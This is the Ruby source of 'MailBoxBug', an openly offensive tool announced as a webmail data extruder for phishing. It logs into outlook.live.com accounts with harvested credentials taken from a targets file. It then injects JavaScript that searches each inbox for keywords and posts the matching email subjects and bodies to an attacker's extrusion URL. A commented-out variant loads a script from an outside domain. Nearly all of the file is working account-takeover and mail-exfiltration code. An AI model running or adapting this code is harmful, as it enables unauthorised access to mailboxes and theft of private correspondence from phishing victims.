# MailBoxBug - An Automated Webmail Data Extruder Tailored For Phishing
# author: @antisnatchor - Nov 2016 - public release @ KiwiCon X

# To install Ruby gems required:
#    gem install sinatra thin watir-webdriver headless colorize datamapper
#      dm-sqlite-adapter dm-timestamps dm-migrations --no-rdoc --no-ri
#
# To instrument Firefox you need to have the geckodriver binary in your PATH.
#     Download it from https://github.com/mozilla/geckodriver/releases
#
# Once you have the binary:
# export PATH=$PATH:OwaInfiltratorPath/drivers
#
# Same staff applies if you prefer instrumenting Chrome, you need the chromedriver
#
# Finally, make sure the data extrusion domain has a valid HTTPS certificate.
#
# Supported Webmails:
# - outlook.live.com
#
#
# Limitations:
# - headless mode via PhantomJs doesn't appear to work. Either the login fails or anyway the content
#     looks different and post-login content cannot be found. Needs investigation via proxying.
# - TODO adjust timeouts after JS is injected to give enough time for XHRs to complete, since it's not synched with the backend
#   TODO a few seconds are usually enough for one keyword search

require 'thread'
require 'yaml'

# very basic thread pool
class ThreadPool
  def initialize(size)
    @size = size
    @queue = Queue.new
    @pool = (1..size).map { Thread.new(&pop_job_loop) }
  end

  def schedule(*args, &blk)
    queue << [blk, args]
  end

  def shutdown
    size.times { schedule { throw :kill } }
    pool.map(&:join)
  end

  protected

  attr_reader :size, :queue, :pool

  private

  def pop_job_loop
    -> { catch(:kill) { loop { rescue_nil(&run_job) } } }
  end

  def rescue_nil
    yield
  rescue => e
    e
  end

  def run_job
    -> { (job, args = queue.pop) && job.call(*args) }
  end
end

class MailBoxBug
  require 'colorize'
  require 'watir-webdriver'

  # various delays in seconds
  LOGIN_DELAY     = 5
  INJECTION_DELAY = 3

  def initialize(config, username, password)
    @user = username
    self.instrument_browser(config, username, password)
  end


    # TODO  - implement this in JS, pass an array of values and iterate accordingly rather than injecting again this
    # TODO  - generate UUID in ruby and pass it to JS as sess_uuid
    def generate_injection(debug_js, extrude_url, target , search_keyword)
      injected_js = <<EOF

var sess_uuid = "8143bfca-d2d9-4707-bab8-74f62af9668c";
var search_string = "#{search_keyword}";
var target_email = "#{target}";

var start_url = "https://outlook.live.com/owa/service.svc?action=StartSearchSession&EP=1&ID=-68&AC=1";
var search_url = "https://outlook.live.com/owa/service.svc?action=ExecuteSearch&EP=1&ID=-35&AC=1";
var getitem_url = "https://outlook.live.com/owa/service.svc?action=GetItem&EP=1&ID=-38&AC=1";

var extrude_url = "#{extrude_url}";

function log(data){
    if(#{debug_js}){
      console.log(data);
    }
}

function extrudeData(data){
    var xhr2 = new XMLHttpRequest();
    xhr2.open("POST", extrude_url, true);
    xhr2.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    //xhr2.timeout = parseInt(timeout, 10);
    xhr2.onerror = function() {}; // TODO handle this
    xhr2.send("data=" + data);
}

function packData(target, keyword, type, subject, body){

    var packet = {
        'target': target,
        'search': keyword,
        'type': type,
        'subject': subject,
        'body': btoa(unescape(encodeURIComponent( body )))
    };
    var jpacket = JSON.stringify(packet);
    return btoa(jpacket);
}

function getMessage(change_key , message_id){
    var xhr2 = new XMLHttpRequest();
    xhr2.open("GET", getitem_url, false);
    xhr2.setRequestHeader("X-OWA-UrlPostData", "%7B%22__type%22%3A%22GetItemJsonRequest%3A%23Exchange%22%2C%22Header%22%3A%7B%22__type%22%3A%22JsonRequestHeaders%3A%23Exchange%22%2C%22RequestServerVersion%22%3A%22V2016_06_24%22%2C%22TimeZoneContext%22%3A%7B%22__type%22%3A%22TimeZoneContext%3A%23Exchange%22%2C%22TimeZoneDefinition%22%3A%7B%22__type%22%3A%22TimeZoneDefinitionType%3A%23Exchange%22%2C%22Id%22%3A%22W.%20Europe%20Standard%20Time%22%7D%7D%7D%2C%22Body%22%3A%7B%22__type%22%3A%22GetItemRequest%3A%23Exchange%22%2C%22ItemShape%22%3A%7B%22__type%22%3A%22ItemResponseShape%3A%23Exchange%22%2C%22BaseShape%22%3A%22IdOnly%22%2C%22FilterHtmlContent%22%3Atrue%2C%22BlockExternalImagesIfSenderUntrusted%22%3Atrue%2C%22BlockContentFromUnknownSenders%22%3Afalse%2C%22AddBlankTargetToLinks%22%3Atrue%2C%22ClientSupportsIrm%22%3Atrue%2C%22InlineImageUrlTemplate%22%3A%22data%3Aimage%2Fgif%3Bbase64%2CR0lGODlhAQABAIAAAAAAAP%2F%2F%2FyH5BAEAAAEALAAAAAABAAEAAAIBTAA7%22%2C%22FilterInlineSafetyTips%22%3Atrue%2C%22MaximumBodySize%22%3A2097152%2C%22MaximumRecipientsToReturn%22%3A20%2C%22CssScopeClassName%22%3A%22rps_c3cc%22%2C%22InlineImageUrlOnLoadTemplate%22%3A%22InlineImageLoader.GetLoader().Load(this)%22%2C%22InlineImageCustomDataTemplate%22%3A%22%7Bid%7D%22%7D%2C%22ItemIds%22%3A%5B%7B%22__type%22%3A%22ItemId%3A%23Exchange%22%2C%22Id%22%3A%22" + encodeURIComponent(message_id) + "%22%2C%22ChangeKey%22%3A%22" + encodeURIComponent(change_key) + "%22%7D%5D%2C%22ShapeName%22%3A%22ItemNormalizedBody%22%7D%7D");
    xhr2.setRequestHeader("Action","GetItem");
    xhr2.onerror = function() {};
    xhr2.onreadystatechange = function() {
        if (xhr2.readyState === 4) {
            try{
                var status = this.status;
                var resp = JSON.parse(this.response);
                var msg = resp['Body']['ResponseMessages']['Items'][0]['Items'][0];
                var msg_sub = msg['Subject'];

                var has_attach = msg['HasAttachments'];
                var msg_body = msg['NormalizedBody']['Value'];
                log("SUBJECT: " + msg_sub);
                log("HTML BODY size: " + msg_body.length);

                var encoded_data = packData(target_email , search_string, 'email', msg_sub , msg_body);
                extrudeData(encoded_data);

                return msg_sub;

            }catch(e){log("ERROR: " + e)};
        }
    };
    xhr2.send();
}

// 1. starts a new Search Session
var xhr = new XMLHttpRequest();
xhr.open("GET", start_url , true);
xhr.setRequestHeader("X-OWA-UrlPostData","%7B%22__type%22%3A%22StartSearchSessionJsonRequest%3A%23Exchange%22%2C%22Header%22%3A%7B%22__type%22%3A%22JsonRequestHeaders%3A%23Exchange%22%2C%22RequestServerVersion%22%3A%22Exchange2013%22%2C%22TimeZoneContext%22%3A%7B%22__type%22%3A%22TimeZoneContext%3A%23Exchange%22%2C%22TimeZoneDefinition%22%3A%7B%22__type%22%3A%22TimeZoneDefinitionType%3A%23Exchange%22%2C%22Id%22%3A%22W.%20Europe%20Standard%20Time%22%7D%7D%7D%2C%22Body%22%3A%7B%22__type%22%3A%22StartSearchSessionRequest%3A%23Exchange%22%2C%22SearchSessionId%22%3A%22" + sess_uuid + "%22%2C%22WarmupOptions%22%3A16777215%2C%22SuggestionTypes%22%3A1%2C%22SearchScope%22%3A%5B%7B%22__type%22%3A%22PrimaryMailboxSearchScopeType%3A%23Exchange%22%2C%22FolderScope%22%3A%7B%22__type%22%3A%22SearchFolderScopeType%3A%23Exchange%22%2C%22BaseFolderId%22%3A%7B%22__type%22%3A%22DistinguishedFolderId%3A%23Exchange%22%2C%22Id%22%3A%22inbox%22%7D%7D%7D%5D%2C%22IdFormat%22%3A%22EwsId%22%2C%22ApplicationId%22%3A%22Owa%22%7D%7D");
xhr.setRequestHeader("Action","StartSearchSession");
xhr.send();

// 2. search for keyword
var xhr = new XMLHttpRequest();
xhr.open('GET', search_url, true);
xhr.open("GET", search_url , true);
xhr.setRequestHeader("X-OWA-UrlPostData","%7B%22__type%22%3A%22ExecuteSearchJsonRequest%3A%23Exchange%22%2C%22Header%22%3A%7B%22__type%22%3A%22JsonRequestHeaders%3A%23Exchange%22%2C%22RequestServerVersion%22%3A%22V2016_06_15%22%2C%22TimeZoneContext%22%3A%7B%22__type%22%3A%22TimeZoneContext%3A%23Exchange%22%2C%22TimeZoneDefinition%22%3A%7B%22__type%22%3A%22TimeZoneDefinitionType%3A%23Exchange%22%2C%22Id%22%3A%22W.%20Europe%20Standard%20Time%22%7D%7D%7D%2C%22Body%22%3A%7B%22__type%22%3A%22ExecuteSearchRequest%3A%23Exchange%22%2C%22ApplicationId%22%3A%22Owa%22%2C%22SearchSessionId%22%3A%22" + sess_uuid + "%22%2C%22SearchScope%22%3A%5B%7B%22__type%22%3A%22PrimaryMailboxSearchScopeType%3A%23Exchange%22%2C%22FolderScope%22%3A%7B%22__type%22%3A%22SearchFolderScopeType%3A%23Exchange%22%2C%22BaseFolderId%22%3A%7B%22__type%22%3A%22DistinguishedFolderId%3A%23Exchange%22%2C%22Id%22%3A%22msgfolderroot%22%7D%7D%7D%5D%2C%22Query%22%3A%22" + search_string + "%22%2C%22SearchRefiners%22%3Anull%2C%22SearchRestrictions%22%3Anull%2C%22IdFormat%22%3A%22EwsId%22%2C%22RetrieveRefiners%22%3Atrue%2C%22MaxRefinersCountPerRefinerType%22%3A5%2C%22ItemTypes%22%3A%22MailConversations%22%2C%22ResultRowOffset%22%3A0%2C%22ResultRowCount%22%3A25%2C%22MaxResultsCountHint%22%3A250%2C%22MaxPreviewLength%22%3A60%2C%22PropertySetName%22%3A%22Owa16%22%2C%22SortOrder%22%3A%22DateTime%22%2C%22IncludeDeleted%22%3Atrue%2C%22Scenario%22%3A%22mail%22%7D%7D");
xhr.setRequestHeader("Action","ExecuteSearch");
xhr.onerror = function() {};

xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                  try{
                    var status  = this.status;
                    var resp = JSON.parse(this.responseText);

                    var conversations = resp['Body']['SearchResults']['Conversations'];
                    log("Found " + conversations.length + " Conversations");

                      // 3. iterate through conversations that match the search criteria - a conversation can have N nested items (emails)
                      for(var i in conversations){
                            // this is in array, where each entry is a mail message
                            var items = conversations[i]['ItemIds'];
                          log("Found " + items.length + " Items in Conversation #" + conversations[i]);

                          // a conversation can have N items, since our search string can be in multiple emails
                          // 4. iterate through emails that matched the searech criteria and retrieve all messages
                          for(var n in items){
                                  var message_changekey = items[n]['ChangeKey'];
                                  var message_id = items[n]['Id'];
                                  log("Retrieved message: " + message_id);

                                  // 5. Now that we have the changeKey and the Id of each message proceed with retrieval
                                  getMessage(message_changekey , message_id);
                            }
                  }
                  }catch(e){log("ERROR: " + e)};
                }
};
xhr.send();
EOF
      injected_js
    end


  def log(data)
    puts "[#{@user}] #{data}"
  end

  def instrument_browser(config, username, password)
    search_keywords = config['search_keywords']

    # TODO only outlook.live.com is supported right now, make it dynamic
    cfg = config['webmails']['outlook_live']
    debug_js = false
    extrude_url = config['extrude_url']

    # TODO check why phantom JS is not working, check proxying it via Burp
    # b = Watir::Browser.new :phantomjs                                                                            # --proxy-server=myproxy.com:8080
    b = Watir::Browser.new :firefox #, :switches => %w[--ignore-certificate-errors --disable-translate ]
    b.goto cfg['url']

    # NOTE : resizing the window works reliably only on firefox
    b.window.resize_to(800, 600)

    self.log "Page title: " + b.title
    self.log "Testing credentials:\n  username: #{username.colorize(:blue)}\n  password: #{password.colorize(:blue)}"

    # TODO check if we can retrieve the userfield via :name like we do with password below
    b.text_field(:id => cfg['user_field']).when_present.set username

    btn = b.button :id => cfg['button_field']
    btn.exists?
    btn.click

    self.log "Waiting for #{LOGIN_DELAY} seconds for the Passwd field to come up..."
    sleep LOGIN_DELAY

    b.text_field(:name => cfg['passwd_field']).when_present.set password

    btn = b.button :id => cfg['button_field']
    btn.exists?
    btn.click

    self.log "Waiting for #{LOGIN_DELAY} seconds for the Login to happen..."
    sleep LOGIN_DELAY

    owa_branding = b.span :class => cfg['detect_login']
    if owa_branding.exists?
      self.log "Login Successful. Proceeding with JavaScript injection....".colorize(:green)

      search_keywords.each do |search|
        self.log "Searching for: #{search}"
        b.execute_script(self.generate_injection(debug_js, extrude_url, username , search));

        sleep INJECTION_DELAY
      end

      # classic way a-la-BeEF (more noisy):
      # b.execute_script( %{var inj = document.createElement("script");
      #     inj.setAttribute("type", "text/javascript");
      #     inj.setAttribute("src", "https://owa-horten.dk/owa/extrude");
      #     document.getElementsByTagName("head")[0].appendChild(inj);
      #    alert('loaded inj');});

    else
      self.log "ERROR: Credentials didn't work.".colorize(:red)
    end

    # close everything TODO: logout call
    b.close
  end

end


# MailBoxBug 'main' starts here
motd = <<EOF

          s.                                      :y
         hN:                                    :Nh
         oMMo`               ::               `yMM/
         `mMMNy+.        `:sNMMds-         ./dNMMh`
          .dMMMMMNdyyyyhNMMMMMMMMMNdyyyyydNMMMMMh`
          `oNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNo`
        .sNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNs.
       .mMMMMMMNhdMMMMMMMMMMMMMMMMMMMMMMMMhdNMMMMMMm.
      .mMMMMMMhooosNMMMMMMMMMMMMMMMMMMMMmsooohMMMMMMm`
      sMMMMMMyooosdMMMMMMMMMMMMMMMMMMMMMMmyooohMMMMMM:
    :yNMMMMMMoooyhymMMMMMMMMMMMMMMMMMMMMNhdsoooMMMMMMNy+`
  :dMhdMMMMMMooosNMMMMMMdNMMMMMMMMNdMMMMMMNooooMMMMMMhhMN:
 sMMMmoMMMMMMyoooohmNmdsoodMMMMMMhoosdmNmhoooohMMMMMM+NMMMy
/MMMMM+hMMMMMMhooooooooooohMMMMMNyooooooooooodMMMMMMssMMMMM/
NMMMMMN-sNMMMMMNdysooosydNMMMMMMMMNhysooosydMMMMMMNo-MMMMMMN
MMMMMMMms/dNMMMMMMMMNMMMMMNo:NN/hNMMMMMNMMMMMMMMNs-yhMMMMMMM
MMMMMMhdMm+:+yNMMMMMMMNmy:/dMdyNo:/ymNMMMMMMMNy+:+mMdhMMMMMM
hMMMMMhsMMMMy+:-------./ymM#{"anti".colorize(:red)}MMmy/.-------:sdMMMM/hMMMMMs
`mMMMMm/MMMMMMMMMdddmMMMMMMMMMMMMMMMMMMmdddMMMMMMMMM+NMMMMy
 `hMMMM/hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMh/MMMMs
   /NMMd-NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN:mMMd-
    .sNMo+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM+yMd:
      .smsyMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM+od:
         ``oMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM+ `
            :NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN:
             `oNMMMMdhsssyhNMMMMMhysoosyNMMMNo`
               `oNMhooooososMMMMhooooososMNo`
                 `-hdhyyyyyyNNNNyshhyyhdd-`
                   .NNyMhdN+    `dMhMhdN:
                    `osdos`       :ymyo`

                  ***  #{"MailBoxBug".colorize(:red)} ***
           * An Automated Webmail Data Extruder *\n                  * Tailored For Phishing *
                    #{"by @antisnatchor".colorize(:red)}

EOF
puts motd

cfg = YAML.load_file('./config.yaml')
THREAD_POOL_SIZE = cfg['thread_pool']

# TODO start the listener from here
#listener = Thread.new { system('rvmsudo ruby extrude_listener.rb') }

targets = JSON.load(File.open('./targets.json'))

targets_queue = Queue.new
targets['targets'].each{|x| targets_queue.push x }

iterations = targets_queue.size / THREAD_POOL_SIZE
iterations = 1 if iterations == 0 # in case the thread pool size is bigger than the number of targets
count = 1

while count <= iterations do
  workers = (0...THREAD_POOL_SIZE).map do
    Thread.new do
      begin
        target = targets_queue.pop(true)
        email = target['user']
        passwd = target['password']
        MailBoxBug.new(cfg, email, passwd)
      rescue ThreadError
      end
    end
  end
  workers.map(&:join)
  count += 1
end

# TODO the listener thread for some reasons is not killed properly. make sure you kill it running mailbox again
#Thread.kill(listener)
#puts 'MailBoxBug completed.'


